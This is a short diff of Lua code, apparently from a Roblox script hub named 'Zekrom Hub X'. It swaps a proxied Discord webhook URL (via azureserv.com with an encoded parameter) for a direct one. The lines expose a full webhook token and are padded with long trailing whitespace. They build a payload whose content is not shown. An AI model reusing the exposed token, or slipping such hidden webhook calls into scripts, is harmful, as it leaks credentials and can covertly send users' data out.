@@ -1,6 +1,6 @@
 
-                           local GetWebhookMirage = "https://azureserv.com/api/webhooks/1189602474429010030/"
-                            local url = GetWebhookMirage.."65BEhDUsc_oYHfZMiw_3MZDUhyv7m2y4lmtCyF9RGPliRdxD5R8ETpUz9CV26fxQKKIR?__cpo=aHR0cHM6Ly9kaXNjb3JkLmNvbQ"                                                                                                                
+                           local GetWebhookMirage = "https://discord.com/api/webhooks/1189602474429010030/"
+                            local url = GetWebhookMirage.."65BEhDUsc_oYHfZMiw_3MZDUhyv7m2y4lmtCyF9RGPliRdxD5R8ETpUz9CV26fxQKKIR"                                                                                                                
                             local data = {
                                 ["username"] = 'Zekrom Hub X',                                                                                                                                                                                                           
                                 ['content'] = '',--'<@&1159482607738830928>',                                                                                                                                                                                            
